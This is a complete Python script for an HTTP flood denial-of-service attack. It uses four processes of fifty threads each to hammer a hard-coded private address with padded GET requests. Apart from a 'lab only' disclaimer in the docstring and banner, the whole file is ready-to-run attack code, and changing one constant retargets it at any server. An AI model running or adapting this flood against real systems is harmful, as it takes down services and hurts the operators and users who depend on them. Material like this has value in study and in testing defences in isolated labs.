#!/usr/bin/env python3
"""
HTTP Flood DoS Attack - Aggressive Multi-process
Educational use in isolated lab only
Usage: sudo python3 attack.py
"""

import socket
import signal
import sys
import multiprocessing
import threading

TARGET = '192.168.56.101'
PORT = 8080
PROCESSES = 4      # Number of CPU processes
THREADS = 50       # Threads per process
running = True

def cleanup(sig=None, frame=None):
    global running
    print("\n[!] Stopping attack...")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# HTTP flood function - sends heavy GET requests
def http_attack():
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET, PORT))
            # Large payload to slow down server
            payload = f"GET /?{'X'*1000} HTTP/1.1\r\nHost:{TARGET}\r\n\r\n"
            s.send(payload.encode())
            s.recv(1)
            s.close()
        except:
            pass

# Worker spawns multiple threads
def worker():
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=http_attack, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    print("=" * 50)
    print("   HTTP FLOOD DoS ATTACK - LAB USE ONLY")
    print("=" * 50)
    print(f"[*] Target: {TARGET}:{PORT}")
    print(f"[*] Power: {PROCESSES} processes x {THREADS} threads")
    print(f"[*] Total: {PROCESSES * THREADS} simultaneous attackers")
    print("[*] Press CTRL+C to stop\n")
    print("[!] ATTACK RUNNING...\n")
    
    # Launch multiple processes
    processes = []
    for _ in range(PROCESSES):
        p = multiprocessing.Process(target=worker, daemon=True)
        p.start()
        processes.append(p)
    
    # Keep main alive until CTRL+C
    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        cleanup()
